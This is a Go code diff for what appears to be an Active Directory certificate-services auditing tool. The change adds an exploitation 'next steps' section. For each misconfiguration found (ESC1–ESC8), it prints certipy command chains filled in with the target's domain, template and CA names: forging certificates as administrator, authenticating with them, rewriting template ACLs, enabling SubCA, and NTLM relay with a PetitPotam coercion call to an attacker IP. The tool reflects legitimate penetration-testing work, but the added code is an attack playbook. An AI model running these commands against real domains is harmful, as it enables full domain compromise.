@@ -214,7 +214,6 @@ func AnalyzeADCS(client *adldap.Client) (*ADCSResult, error) {
 		result.CAFindings = append(result.CAFindings, esc7Findings...)
 	}
 
-	printADCSResult(result, false)
 	return result, nil
 }
 
@@ -557,31 +556,91 @@ func printADCSResult(r *ADCSResult, showNextSteps bool) {
 	}
 
 	// Next steps
-	hasCritical := critCount > 0 || func() bool {
-		for _, cf := range r.CAFindings {
-			if containsVuln(cf.VulnTypes, ESC6) {
-				return true
-			}
-		}
-		return false
-	}()
+	if !showNextSteps {
+		return
+	}
 
-	if showNextSteps && (hasCritical || len(r.TemplateFindings) > 0) {
-		color.Cyan("\n  NEXT STEPS")
-		if critCount > 0 {
-			color.White("  ESC1  certipy req -u user@%s -p pass -ca <CA> -template <tmpl> -upn admin@%s", r.Domain, r.Domain)
-			color.White("        certipy auth -pfx admin.pfx -domain %s -dc-ip <DC>", r.Domain)
+	// collect which ESC types are present across all findings
+	vulnSet := map[ADCSVulnType][]string{} // vuln → template names
+	for _, f := range r.TemplateFindings {
+		for _, v := range f.VulnTypes {
+			vulnSet[v] = append(vulnSet[v], f.TemplateName)
 		}
-		for _, cf := range r.CAFindings {
-			if containsVuln(cf.VulnTypes, ESC8) {
-				color.White("  ESC8  certipy relay -target http://%s/certsrv/certfnsh.asp -template Machine", cf.CAName)
-				break
-			}
+	}
+	for _, cf := range r.CAFindings {
+		for _, v := range cf.VulnTypes {
+			vulnSet[v] = append(vulnSet[v], cf.CAName)
+		}
+	}
+
+	if len(vulnSet) == 0 {
+		return
+	}
+
+	color.Cyan("\n  NEXT STEPS")
+
+	if tmpls, ok := vulnSet[ESC1]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC1  — SAN injection via vulnerable template")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
+		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
+	}
+
+	if tmpls, ok := vulnSet[ESC2]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC2  — Any Purpose EKU (treat as ESC1)")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
+	}
+
+	if tmpls, ok := vulnSet[ESC3]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC3  — Certificate Request Agent: enroll enrollment-agent cert, then req on behalf of DA")
+		color.White("    # Step 1: get enrollment agent certificate")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
+		color.White("    # Step 2: request cert as administrator")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template 'User' -on-behalf-of '%s\\administrator' -pfx user.pfx", r.Domain, r.Domain)
+		color.White("    certipy auth -pfx administrator.pfx -domain %s", r.Domain)
+	}
+
+	if tmpls, ok := vulnSet[ESC4]; ok {
+		tmpl := tmpls[0]
+		color.White("  ESC4  — Write ACL on template: modify template to add ESC1, then exploit as ESC1")
+		color.White("    certipy template -u 'user@%s' -p 'pass' -template '%s' -save-old", r.Domain, tmpl)
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
+		color.White("    certipy template -u 'user@%s' -p 'pass' -template '%s' -configuration '%s.json'  # restore", r.Domain, tmpl, tmpl)
+	}
+
+	if _, ok := vulnSet[ESC6]; ok {
+		color.White("  ESC6  — CA flag ATTRIBUTESUBJECTALTNAME2: SAN injection works for ANY template")
+		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template 'User' -upn 'administrator@%s'", r.Domain, r.Domain)
+		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
+	}
+
+	if cas, ok := vulnSet[ESC7]; ok {
+		ca := cas[0]
+		color.White("  ESC7  — ManageCA/ManageCertificates on CA '%s'", ca)
+		color.White("    # If ManageCA: enable ATTRIBUTESUBJECTALTNAME2 flag → becomes ESC6")
+		color.White("    certipy ca -u 'user@%s' -p 'pass' -ca '%s' -enable-template 'SubCA'", r.Domain, ca)
+		color.White("    # If ManageCertificates: approve pending requests")
+		color.White("    certipy ca -u 'user@%s' -p 'pass' -ca '%s' -issue-request <request-id>", r.Domain, ca)
+	}
+
+	for _, cf := range r.CAFindings {
+		if containsVuln(cf.VulnTypes, ESC8) {
+			color.White("  ESC8  — Web Enrollment NTLM relay (PetitPotam/Coercer → certipy)")
+			color.White("    certipy relay -target 'http://%s/certsrv/certfnsh.asp' -template 'DomainController'", cf.CAName)
+			color.White("    # Trigger coercion: python3 PetitPotam.py <attacker-ip> %s", cf.CAName)
+			break
 		}
 	}
 }
 
-// PrintADCSResult — public wrapper for standalone adcs command (shows next steps)
+// PrintADCSResult — standalone adcs command (shows next steps)
 func PrintADCSResult(r *ADCSResult) {
 	printADCSResult(r, true)
+}
+
+// PrintADCSResultSummary — summary only, no next steps (used by enum command)
+func PrintADCSResultSummary(r *ADCSResult) {
+	printADCSResult(r, false)
 }
